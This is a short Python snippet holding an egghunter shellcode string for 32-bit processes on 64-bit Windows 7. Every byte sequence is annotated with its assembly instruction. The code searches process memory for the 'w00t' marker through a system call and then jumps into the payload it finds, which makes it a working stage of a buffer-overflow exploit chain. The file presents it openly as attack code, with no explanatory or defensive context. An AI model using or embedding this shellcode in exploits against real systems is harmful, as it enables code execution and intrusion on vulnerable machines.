#modern egghunter for wow64 - Windows 7
eggh = (
"\x31\xdb"                            # XOR EBX, EBX
"\x53"                                # PUSH EBX
"\x53"                                # PUSH EBX
"\x53"                                # PUSH EBX
"\x53"                                # PUSH EBX
"\xb3\xc0"			      			  # MOV BL,0xc0
"\x66\x81\xCA\xFF\x0F"                # OR DX,0FFF
"\x42"                                # INC EDX
"\x52"                                # PUSH EDX
"\x6A\x26"    						  # PUSH 26 
"\x58"                                # POP EAX
"\x33\xC9"     						  # XOR ECX,ECX
"\x8B\xD4"      					  # MOV EDX,ESP
"\x64\xff\x13"         				  # CALL DWORD PTR FS:[ebx]
"\x5e"                                # POP ESI
"\x5a"                                # POP EDX
"\x3C\x05"      					  # CMP AL,5
"\x74\xe9"      					  # JE SHORT egg.0043F000
"\xB8\x77\x30\x30\x74"       		  # MOV EAX,74303077 w00t
"\x8B\xFA"                            # MOV EDI,EDX
"\xAF"                                # SCAS DWORD PTR ES:[EDI]
"\x75\xe4"                            # JNZ SHORT egg.0043F001
"\xAF"                                # SCAS DWORD PTR ES:[EDI]
"\x75\xe1"                            # JNZ SHORT 0043F001
"\xFF\xE7"                            # JMP EDI
)

